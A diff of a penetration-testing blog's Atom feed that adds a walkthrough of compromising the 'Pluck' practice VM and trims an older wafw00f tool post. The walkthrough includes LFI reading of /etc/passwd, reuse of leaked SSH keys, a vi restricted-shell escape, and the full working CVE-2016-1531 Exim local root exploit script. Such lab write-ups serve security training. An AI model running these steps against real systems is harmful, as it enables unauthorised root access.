@@ -4,7 +4,7 @@
   <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2017-07-05T07:05:27-04:00</updated>
+  <updated>2017-07-06T11:40:31-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,393 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Got Pluck?]]></title>
+    <link href="http://chousensha.github.io/blog/2017/07/06/got-pluck/"/>
+    <updated>2017-07-06T06:28:41-04:00</updated>
+    <id>http://chousensha.github.io/blog/2017/07/06/got-pluck</id>
+    <content type="html"><![CDATA[<p>New day, new machine to hack! Today&rsquo;s target is called Pluck.</p>
+
+<!-- more -->
+
+
+<h2>Recon</h2>
+
+<p>Nmap results:</p>
+
+<p><code>
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)
+|_  256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Pluck
+3306/tcp open  mysql   MySQL (unauthorized)
+5355/tcp open  llmnr?
+</code></p>
+
+<p>First order of business, the web server:</p>
+
+<p><img class="center" src="/images/pentest/pluck/pluck.png" title="&lsquo;pluck&rsquo; &lsquo;pluck&rsquo;" ></p>
+
+<p>I ran Nikto on it and it revealed a couple of vulnerabilities:</p>
+
+<p><code>
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
++ OSVDB-29786: /admin.php?en_log_id=0&amp;action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
++ OSVDB-29786: /admin.php?en_log_id=0&amp;action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
++ OSVDB-3092: /admin.php: This might be interesting...
++ OSVDB-3268: /images/: Directory indexing found.
++ OSVDB-3268: /images/?pattern=/etc/*&amp;sort=name: Directory indexing found.
++ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7535 requests: 0 error(s) and 12 item(s) reported on remote host
++ End Time:           2017-07-06 09:41:42 (GMT-4) (22 seconds)
+</code></p>
+
+<p>First, I went to the admin page and it seems vulnerable to SQL injection:</p>
+
+<p><img class="center" src="/images/pentest/pluck/admin.png" title="&lsquo;admin&rsquo; &lsquo;admin sqli&rsquo;" ></p>
+
+<p>I fired up sqlmap but I couldn&rsquo;t get anything out of the database. Maybe it was a false lead. Next I looked at the LFI vulnerability that Nikto detected and took a peak at <em>/etc/passwd</em>:</p>
+
+<p><code>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:109::/var/run/dbus:/bin/false
+mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
+lxd:x:108:65534::/var/lib/lxd/:/bin/false
+uuidd:x:109:114::/run/uuidd:/bin/false
+dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+pollinate:x:112:1::/var/cache/pollinate:/bin/false
+bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
+Debian-exim:x:113:119::/var/spool/exim4:/bin/false
+peter:x:1001:1001:,,,:/home/peter:/bin/bash
+paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu
+backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh
+</code></p>
+
+<p>The last entry is interesting. I used the LFI to look at the script:</p>
+
+<p>```</p>
+
+<h6>#</h6>
+
+<h1>Server Backup script</h1>
+
+<h6>#</h6>
+
+<h1>Backup directories in /backups so we can get it via tftp</h1>
+
+<p>echo &ldquo;Backing up data&rdquo;
+tar -cf /backups/backup.tar /home /var/www/html > /dev/null 2&amp; > /dev/null
+echo &ldquo;Backup complete&rdquo;
+```</p>
+
+<p>A TFTP reference, and I didn&rsquo;t scan for UDP ports. I went back to Nmap real quick:</p>
+
+<p>```
+nmap -T4 -sU -p69 192.168.217.147</p>
+
+<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-07-06 09:59 EDT
+Nmap scan report for 192.168.217.147
+Host is up (0.00016s latency).
+PORT   STATE         SERVICE
+69/udp open|filtered tftp
+```</p>
+
+<p>I got the archive via T<a href="FTP:">FTP:</a></p>
+
+<p><code>
+tftp 192.168.217.147
+tftp&gt; get /backups/backup.tar
+Received 1824718 bytes in 1.4 seconds
+</code></p>
+
+<p>Extracted it to find some home directory contents, besides the source for the website:</p>
+
+<p><code>
+tar -xvf backup.tar
+home/
+home/bob/
+home/bob/.bashrc
+home/bob/.sudo_as_admin_successful
+home/bob/.profile
+home/bob/.bash_logout
+home/paul/
+home/paul/keys/
+home/paul/keys/id_key3.pub
+home/paul/keys/id_key2.pub
+home/paul/keys/id_key2
+home/paul/keys/id_key4.pub
+home/paul/keys/id_key5.pub
+home/paul/keys/id_key6
+home/paul/keys/id_key1
+home/paul/keys/id_key5
+home/paul/keys/id_key1.pub
+home/paul/keys/id_key6.pub
+home/paul/keys/id_key4
+home/paul/keys/id_key3
+home/paul/.bashrc
+home/paul/.profile
+home/paul/.bash_logout
+home/peter/
+home/peter/.bashrc
+home/peter/.profile
+home/peter/.bash_logout
+var/www/html/
+var/www/html/fonts/
+var/www/html/fonts/glyphicons-halflings-regular.svg
+var/www/html/fonts/glyphicons-halflings-regular.woff2
+var/www/html/fonts/glyphicons-halflings-regular.ttf
+var/www/html/fonts/glyphicons-halflings-regular.woff
+var/www/html/fonts/glyphicons-halflings-regular.eot
+var/www/html/about.php
+var/www/html/index.php
+var/www/html/footer.php
+var/www/html/css/
+var/www/html/css/bootstrap.css.map
+var/www/html/css/bootstrap.min.css.map
+var/www/html/css/bootstrap-theme.css
+var/www/html/css/bootstrap-theme.min.css
+var/www/html/css/bootstrap.min.css
+var/www/html/css/bootstrap-theme.min.css.map
+var/www/html/css/bootstrap-theme.css.map
+var/www/html/css/bootstrap.css
+var/www/html/header.php
+var/www/html/admin.php
+var/www/html/js/
+var/www/html/js/jquery.min.js
+var/www/html/js/bootstrap.js
+var/www/html/js/npm.js
+var/www/html/js/bootstrap.min.js
+</code></p>
+
+<p>Bob&rsquo;s directory:</p>
+
+<p><code>
+root@kali:~/home/bob# ls -la
+total 20
+drwxr-xr-x 2 1000 1000 4096 Jan 18 07:43 .
+drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
+-rw-r--r-- 1 1000 1000  220 Jan 18 00:39 .bash_logout
+-rw-r--r-- 1 1000 1000 3771 Jan 18 00:39 .bashrc
+-rw-r--r-- 1 1000 1000  655 Jan 18 00:39 .profile
+-rw-r--r-- 1 1000 1000    0 Jan 18 03:40 .sudo_as_admin_successful
+</code></p>
+
+<p>That sudo file was empty. On to paul:</p>
+
+<p><code>
+root@kali:~/home/paul# ls -la
+total 24
+drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 .
+drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
+-rw-r--r-- 1 1002 1002  220 Jan 18 03:04 .bash_logout
+-rw-r--r-- 1 1002 1002 3771 Jan 18 03:04 .bashrc
+drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 keys
+-rw-r--r-- 1 1002 1002  655 Jan 18 03:04 .profile
+root@kali:~/home/paul# ls -la keys/
+total 56
+drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 .
+drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 ..
+-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key1
+-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key1.pub
+-rwxrwxr-x 1 1002 1002  672 Jan 18 13:08 id_key2
+-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key2.pub
+-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key3
+-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key3.pub
+-rwxrwxr-x 1 1002 1002 1679 Jan 18 13:09 id_key4
+-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key4.pub
+-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key5
+-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key5.pub
+-rwxrwxr-x 1 1002 1002 1675 Jan 18 13:09 id_key6
+-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key6.pub
+</code></p>
+
+<p>It looks like paul didn&rsquo;t put much effort into securing his SSH keys. Lastly, peter:</p>
+
+<p><code>
+root@kali:~/home/peter# ls -la
+total 20
+drwxr-xr-x 2 1001 1001 4096 Jan 18 03:04 .
+drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
+-rw-r--r-- 1 1001 1001  220 Jan 18 03:04 .bash_logout
+-rw-r--r-- 1 1001 1001 3771 Jan 18 03:04 .bashrc
+-rw-r--r-- 1 1001 1001  655 Jan 18 03:04 .profile
+</code></p>
+
+<h2>Privilege escalation</h2>
+
+<p>Back to paul, and trying those SSH keys. Tried each, the 4th one worked, but it dropped me to this menu:</p>
+
+<p><img class="center" src="/images/pentest/pluck/pdmenu.png" title="&lsquo;pdmenu&rsquo; &lsquo;pdmenu&rsquo;" ></p>
+
+<p>So, what is pdmenu?</p>
+
+<blockquote><p>Pdmenu is a full screen menuing system for Unix. It is designed to be easy to use, and is suitable as a login shell
+for inexperienced users, or it can just be ran at the command line as a handy menu.</p></blockquote>
+
+<p>Not much I can do with this, however, the option to edit a file launches vi! I remembered another challenge where vi helped me escape shell restrictions, and found a <a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">SANS article</a> about this exact topic. To get a proper shell, I typed the following in vi&rsquo;s command mode:</p>
+
+<p><code>
+:set shell=/bin/bash
+:!bash
+</code></p>
+
+<p>That dropped me into paul&rsquo;s shell:</p>
+
+<p><code>
+paul@pluck:~$ id
+uid=1002(paul) gid=1002(paul) groups=1002(paul)
+</code></p>
+
+<p>SUID enumeration led me to the next step:</p>
+
+<p><code>
+paul@pluck:~$ find / -perm -4000 2&gt;/dev/null
+/usr/exim/bin/exim-4.84-7
+/usr/bin/passwd
+/usr/bin/at
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/traceroute6.iputils
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/s-nail/s-nail-privsep
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/su
+/bin/umount
+/bin/mount
+/bin/fusermount
+/bin/ping
+/bin/ntfs-3g
+</code></p>
+
+<p>Exim is a MTA similar to sendmail. Googling for an exploit yielded a <a href="https://www.exploit-db.com/exploits/39535/">local root exploit</a>. I used vi to create a shell script with the exploit code, changed it to executable and ran it:</p>
+
+<p>```
+paul@pluck:~$ vi rootme.sh
+paul@pluck:~$ cat rootme.sh
+echo [ CVE-2016-1531 local root exploit
+cat > /tmp/root.pm &lt;&lt; EOF
+package root;
+use strict;
+use warnings;</p>
+
+<p>system(&ldquo;/bin/sh&rdquo;);
+EOF
+PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps</p>
+
+<p>paul@pluck:~$ ./rootme.sh
+[ CVE-2016-1531 local root exploit</p>
+
+<h1>whoami</h1>
+
+<p>root
+```</p>
+
+<p>The flag is mine!</p>
+
+<p>```</p>
+
+<h1>cat /root/flag.txt</h1>
+
+<p>Congratulations you found the flag</p>
+
+<hr />
+
+<h6>((((((((((((((((((((((((((((((</h6>
+
+<h6>###   (((((((((((((((((((((((((((</h6>
+
+<p>,,##########   ((((((((((((((((((((((((
+@@,,,##########   (((((((((((((((((((((
+@@@@@,,,##########                   <br/>
+@@@@@@@@,,,############################
+@@@@@@@@@@@,,,#########################
+@@@@@@@@@,,,###########################
+@@@@@@,,,##########                  <br/>
+@@@,,,##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
+,,,##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</p>
+
+<h6>####   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</h6>
+
+<h6>#   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</h6>
+
+<p>```</p>
+
+<p>Interesting twist on this VM with the pdbmenu escape!</p>
+
+<p><strong>Learn more</strong></p>
+
+<ul>
+<li><a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">escape restricted Linux shells</a></li>
+</ul>
+
+
+<p>```</p>
+
+<hr />
+
+<p>/ Q: How many Zen masters does it take to \
+| screw in a light bulb? A: None. The     |
+| Universe spins the bulb, and the Zen    |
+| master stays out                        |
+|                                         |
+\ of the way.                             /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[urlcrazy - Kali Linux tools]]></title>
@@ -573,7 +960,7 @@ Google API key and CSE ID in the plugin (discovery/googleCSE.py)</p>
 <li>TheHarvester Ver. 2.7                                           *</li>
 <li>Coded by Christian Martorella                                   *</li>
 <li>Edge-Security Research                                          *</li>
-<li><a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x63;&#x6d;&#97;&#x72;&#116;&#x6f;&#x72;&#101;&#108;&#108;&#97;&#x40;&#x65;&#x64;&#x67;&#101;&#45;&#x73;&#101;&#99;&#117;&#114;&#x69;&#x74;&#121;&#x2e;&#99;&#x6f;&#109;">&#99;&#109;&#x61;&#x72;&#116;&#111;&#x72;&#x65;&#108;&#x6c;&#x61;&#64;&#x65;&#100;&#103;&#101;&#x2d;&#115;&#x65;&#99;&#117;&#x72;&#105;&#116;&#121;&#46;&#99;&#x6f;&#109;</a>                                   *</li>
+<li><a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#99;&#x6d;&#x61;&#x72;&#116;&#x6f;&#x72;&#101;&#108;&#108;&#x61;&#64;&#x65;&#100;&#103;&#101;&#x2d;&#115;&#101;&#x63;&#117;&#x72;&#105;&#116;&#x79;&#46;&#99;&#x6f;&#109;">&#99;&#109;&#97;&#x72;&#116;&#x6f;&#114;&#x65;&#108;&#108;&#x61;&#64;&#x65;&#100;&#x67;&#x65;&#45;&#115;&#101;&#99;&#117;&#x72;&#x69;&#x74;&#x79;&#x2e;&#99;&#x6f;&#x6d;</a>                                   *</li>
 </ul>
 
 
@@ -631,7 +1018,7 @@ theharvester -d hackerone.com -l 200 -b all -f harvested</p>
 <li>TheHarvester Ver. 2.7                                           *</li>
 <li>Coded by Christian Martorella                                   *</li>
 <li>Edge-Security Research                                          *</li>
-<li><a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#99;&#109;&#x61;&#114;&#x74;&#111;&#114;&#101;&#x6c;&#108;&#x61;&#64;&#101;&#100;&#x67;&#101;&#x2d;&#x73;&#101;&#x63;&#x75;&#x72;&#105;&#116;&#121;&#46;&#99;&#111;&#109;">&#99;&#x6d;&#97;&#114;&#116;&#111;&#114;&#x65;&#108;&#108;&#97;&#x40;&#x65;&#100;&#x67;&#x65;&#x2d;&#115;&#101;&#x63;&#117;&#x72;&#105;&#x74;&#121;&#46;&#99;&#111;&#x6d;</a>                                   *</li>
+<li><a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#99;&#x6d;&#97;&#114;&#x74;&#111;&#114;&#x65;&#108;&#108;&#97;&#64;&#101;&#x64;&#103;&#101;&#45;&#x73;&#x65;&#99;&#117;&#x72;&#x69;&#x74;&#121;&#x2e;&#x63;&#x6f;&#109;">&#99;&#x6d;&#x61;&#x72;&#x74;&#x6f;&#114;&#x65;&#108;&#x6c;&#x61;&#64;&#101;&#x64;&#103;&#x65;&#45;&#115;&#x65;&#x63;&#x75;&#x72;&#105;&#116;&#x79;&#x2e;&#99;&#111;&#109;</a>                                   *</li>
 </ul>
 
 
@@ -665,8 +1052,8 @@ Searching 250 results...
 
 <h2>[+] Emails found:</h2>
 
-<p><a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#102;&#x65;&#x65;&#x64;&#98;&#x61;&#99;&#x6b;&#x40;&#x68;&#x61;&#x63;&#x6b;&#x65;&#114;&#111;&#x6e;&#101;&#x2e;&#x63;&#x6f;&#x6d;">&#x66;&#101;&#x65;&#100;&#x62;&#x61;&#99;&#107;&#x40;&#x68;&#97;&#99;&#107;&#101;&#x72;&#111;&#x6e;&#101;&#x2e;&#99;&#x6f;&#x6d;</a>
-<a href="&#109;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#x73;&#117;&#x70;&#x70;&#x6f;&#x72;&#116;&#64;&#104;&#97;&#x63;&#x6b;&#101;&#x72;&#x6f;&#110;&#101;&#x2e;&#99;&#x6f;&#109;">&#115;&#117;&#x70;&#112;&#111;&#114;&#x74;&#64;&#x68;&#x61;&#x63;&#x6b;&#x65;&#114;&#111;&#110;&#101;&#x2e;&#99;&#111;&#109;</a>
+<p><a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#x66;&#101;&#x65;&#x64;&#x62;&#x61;&#x63;&#x6b;&#64;&#x68;&#97;&#99;&#x6b;&#101;&#114;&#111;&#x6e;&#101;&#46;&#99;&#x6f;&#109;">&#102;&#101;&#x65;&#x64;&#98;&#97;&#99;&#107;&#64;&#x68;&#97;&#x63;&#107;&#x65;&#114;&#x6f;&#x6e;&#x65;&#46;&#x63;&#x6f;&#x6d;</a>
+<a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x73;&#x75;&#112;&#x70;&#x6f;&#x72;&#x74;&#x40;&#x68;&#x61;&#x63;&#x6b;&#x65;&#114;&#x6f;&#x6e;&#x65;&#x2e;&#99;&#111;&#x6d;">&#x73;&#x75;&#x70;&#x70;&#x6f;&#114;&#116;&#64;&#104;&#x61;&#x63;&#x6b;&#x65;&#114;&#111;&#110;&#101;&#x2e;&#99;&#x6f;&#109;</a>
 [REDACTED}</p>
 
 <h2>[+] Hosts found in search engines:</h2>
@@ -709,7 +1096,7 @@ theharvester -d cisco.com -b linkedin -l 100 -f cisco</p>
 <li>TheHarvester Ver. 2.7                                           *</li>
 <li>Coded by Christian Martorella                                   *</li>
 <li>Edge-Security Research                                          *</li>
-<li><a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#x63;&#x6d;&#97;&#114;&#116;&#x6f;&#114;&#101;&#108;&#108;&#97;&#x40;&#x65;&#x64;&#103;&#101;&#x2d;&#115;&#x65;&#x63;&#x75;&#x72;&#x69;&#116;&#x79;&#46;&#99;&#x6f;&#109;">&#99;&#x6d;&#x61;&#114;&#x74;&#x6f;&#114;&#101;&#108;&#108;&#97;&#64;&#101;&#x64;&#x67;&#x65;&#x2d;&#115;&#101;&#99;&#x75;&#x72;&#x69;&#116;&#121;&#x2e;&#x63;&#x6f;&#x6d;</a>                                   *</li>
+<li><a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#99;&#109;&#x61;&#x72;&#x74;&#111;&#114;&#101;&#108;&#108;&#x61;&#64;&#101;&#100;&#103;&#x65;&#x2d;&#115;&#101;&#x63;&#117;&#114;&#105;&#116;&#x79;&#x2e;&#x63;&#x6f;&#x6d;">&#x63;&#x6d;&#x61;&#x72;&#116;&#x6f;&#x72;&#101;&#x6c;&#x6c;&#97;&#64;&#101;&#x64;&#103;&#x65;&#x2d;&#x73;&#101;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#46;&#99;&#x6f;&#x6d;</a>                                   *</li>
 </ul>
 
 
@@ -750,7 +1137,7 @@ theharvester -d chousensha.github.io -l 10 -b twitter</p>
 <li>TheHarvester Ver. 2.7                                           *</li>
 <li>Coded by Christian Martorella                                   *</li>
 <li>Edge-Security Research                                          *</li>
-<li><a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#99;&#109;&#x61;&#114;&#116;&#111;&#114;&#101;&#x6c;&#x6c;&#x61;&#x40;&#x65;&#x64;&#x67;&#101;&#45;&#115;&#x65;&#99;&#117;&#114;&#x69;&#x74;&#x79;&#46;&#x63;&#x6f;&#x6d;">&#x63;&#109;&#x61;&#x72;&#116;&#x6f;&#x72;&#101;&#x6c;&#x6c;&#x61;&#64;&#101;&#100;&#103;&#x65;&#x2d;&#115;&#x65;&#99;&#x75;&#114;&#105;&#116;&#x79;&#x2e;&#x63;&#111;&#x6d;</a>                                   *</li>
+<li><a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#x63;&#x6d;&#x61;&#114;&#x74;&#x6f;&#114;&#x65;&#108;&#108;&#97;&#x40;&#101;&#100;&#x67;&#x65;&#x2d;&#115;&#x65;&#x63;&#117;&#x72;&#105;&#116;&#x79;&#46;&#x63;&#111;&#109;">&#x63;&#x6d;&#x61;&#x72;&#116;&#111;&#114;&#101;&#108;&#x6c;&#97;&#x40;&#101;&#100;&#x67;&#101;&#x2d;&#115;&#101;&#x63;&#x75;&#x72;&#105;&#x74;&#x79;&#46;&#99;&#x6f;&#x6d;</a>                                   *</li>
 </ul>
 
 
@@ -1393,237 +1780,6 @@ firstboot_done  key-3-of-3.txt</p>
 
 <p>/ You have literary talent that you \
 \ should take pains to develop.     /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[wafw00f - Kali Linux tools]]></title>
-    <link href="http://chousensha.github.io/blog/2017/06/30/wafw00f-kali-linux-tools/"/>
-    <updated>2017-06-30T04:46:55-04:00</updated>
-    <id>http://chousensha.github.io/blog/2017/06/30/wafw00f-kali-linux-tools</id>
-    <content type="html"><![CDATA[<p><strong>Objective</strong>: you need to establish if a web application firewall is in place, and ideally, what type of WAF it is. You can go bark at it with wafw00f!</p>
-
-<p>Homepage: <a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>
-
-<!-- more -->
-
-
-<h2>wafw00f description</h2>
-
-<blockquote><p>WAFW00F identifies and fingerprints Web Application Firewall (WAF) products.</p>
-
-<p>How does it work?</p>
-
-<p>To do its magic, WAFW00F does the following:</p>
-
-<p> Sends a normal HTTP request and analyses the response; this identifies a number of WAF solutions</p>
-
-<p> If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to
-deduce which WAF it is</p>
-
-<p> If that is also not successful, it analyses the responses previously returned and uses another simple algorithm
-to guess if a WAF or security solution is actively responding to our attacks</p></blockquote>
-
-<h2>wafw00f options</h2>
-
-<p>```
-wafw00f -h</p>
-
-<pre><code>                             ^     ^
-    _   __  _   ____ _   __  _    _   ____
-   ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
-  | V V // o // _/ | V V // 0 // 0 // _/
-  |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
-                            &lt;
-                             ...'
-
-WAFW00F - Web Application Firewall Detection Tool
-
-By Sandro Gauci &amp;&amp; Wendel G. Henrique
-</code></pre>
-
-<p>Usage: wafw00f url1 [url2 [url3 &hellip; ]]
-example: wafw00f <a href="http://www.victim.org/">http://www.victim.org/</a></p>
-
-<p>Options:
-  -h, &mdash;help            show this help message and exit
-  -v, &mdash;verbose         enable verbosity &ndash; multiple -v options increase</p>
-
-<pre><code>                    verbosity
-</code></pre>
-
-<p>  -a, &mdash;findall         Find all WAFs, do not stop testing on the first one
-  -r, &mdash;disableredirect</p>
-
-<pre><code>                    Do not follow redirections given by 3xx responses
-</code></pre>
-
-<p>  -t TEST, &mdash;test=TEST  Test for one specific WAF
-  -l, &mdash;list            List all WAFs that we are able to detect
-  &mdash;xmlrpc              Switch on the XML-RPC interface instead of CUI
-  &mdash;xmlrpcport=XMLRPCPORT</p>
-
-<pre><code>                    Specify an alternative port to listen on, default 8001
-</code></pre>
-
-<p>  -V, &mdash;version         Print out the version
-```</p>
-
-<h2>wafw00f usage</h2>
-
-<ul>
-<li>see what WAFs it can detect at the moment</li>
-</ul>
-
-
-<p>```
-wafw00f -l</p>
-
-<pre><code>                             ^     ^
-    _   __  _   ____ _   __  _    _   ____
-   ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
-  | V V // o // _/ | V V // 0 // 0 // _/
-  |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
-                            &lt;
-                             ...'
-
-WAFW00F - Web Application Firewall Detection Tool
-
-By Sandro Gauci &amp;&amp; Wendel G. Henrique
-</code></pre>
-
-<p>Can test for these WAFs:</p>
-
-<p>Profense
-NetContinuum
-Incapsula WAF
-CloudFlare
-USP Secure Entry Server
-Cisco ACE XML Gateway
-Barracuda Application Firewall
-Art of Defence HyperGuard
-BinarySec
-Teros WAF
-F5 BIG-IP LTM
-F5 BIG-IP APM
-F5 BIG-IP ASM
-F5 FirePass
-F5 Trafficshield
-InfoGuard Airlock
-Citrix NetScaler
-Trustwave ModSecurity
-IBM Web Application Security
-IBM DataPower
-DenyALL WAF
-Applicure dotDefender
-Juniper WebApp Secure
-Microsoft URLScan
-Aqtronix WebKnight
-eEye Digital Security SecureIIS
-Imperva SecureSphere
-Microsoft ISA Server
-```</p>
-
-<ul>
-<li>detect WAF</li>
-</ul>
-
-
-<p>```
-wafw00f <a href="https://bugcrowd.com">https://bugcrowd.com</a></p>
-
-<pre><code>                             ^     ^
-    _   __  _   ____ _   __  _    _   ____
-   ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
-  | V V // o // _/ | V V // 0 // 0 // _/
-  |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
-                            &lt;
-                             ...'
-
-WAFW00F - Web Application Firewall Detection Tool
-
-By Sandro Gauci &amp;&amp; Wendel G. Henrique
-</code></pre>
-
-<p>Checking <a href="https://bugcrowd.com">https://bugcrowd.com</a>
-The site <a href="https://bugcrowd.com">https://bugcrowd.com</a> is behind a CloudFlare
-Number of requests: 1
-```</p>
-
-<ul>
-<li>not detecting WAF</li>
-</ul>
-
-
-<p>```
-wafw00f cisco.com</p>
-
-<pre><code>                             ^     ^
-    _   __  _   ____ _   __  _    _   ____
-   ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
-  | V V // o // _/ | V V // 0 // 0 // _/
-  |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
-                            &lt;
-                             ...'
-
